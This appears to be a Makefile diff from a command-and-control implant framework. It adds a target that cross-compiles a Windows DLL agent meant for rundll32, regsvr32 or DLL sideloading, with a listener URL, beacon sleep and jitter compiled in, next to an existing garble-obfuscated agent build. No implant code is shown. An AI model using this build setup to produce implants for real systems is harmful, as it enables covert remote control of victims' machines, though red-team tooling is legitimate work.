@@ -61,8 +61,22 @@ agent-garble-windows: ## Obfuscated Windows agent via garble
 	  -o $(AGENT_DIR)/$(AGENT_BIN)_windows_amd64_garbled.exe ./cmd/agent
 	@echo "[+] Obfuscated agent built: $(AGENT_DIR)/$(AGENT_BIN)_windows_amd64_garbled.exe"
 
+.PHONY: agent-dll
+agent-dll: ## Cross-compile Windows DLL agent (rundll32/regsvr32/sideload)
+	@echo "[*] Building Windows/amd64 DLL agent..."
+	@mkdir -p $(AGENT_DIR)
+	GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc \
+	go build -buildmode=c-shared \
+	  -ldflags "$(LDFLAGS) \
+	  -X '$(MODULE)/internal/implant.ListenerURL=$(LISTENER_URL)' \
+	  -X '$(MODULE)/internal/implant.SleepSeconds=$(SLEEP)' \
+	  -X '$(MODULE)/internal/implant.JitterPercent=$(JITTER)' \
+	  -X '$(MODULE)/internal/implant.ServerPubKey=$(SERVER_PUBKEY)'" \
+	  -o $(AGENT_DIR)/$(AGENT_BIN)_windows_amd64.dll ./cmd/agent-dll
+	@echo "[+] DLL built: $(AGENT_DIR)/$(AGENT_BIN)_windows_amd64.dll"
+
 .PHONY: agent-all
-agent-all: agent-windows agent-linux ## Build all agent variants
+agent-all: agent-windows agent-linux agent-dll ## Build all agent variants
 
 # ──────────────── Utilities ─────────────
 
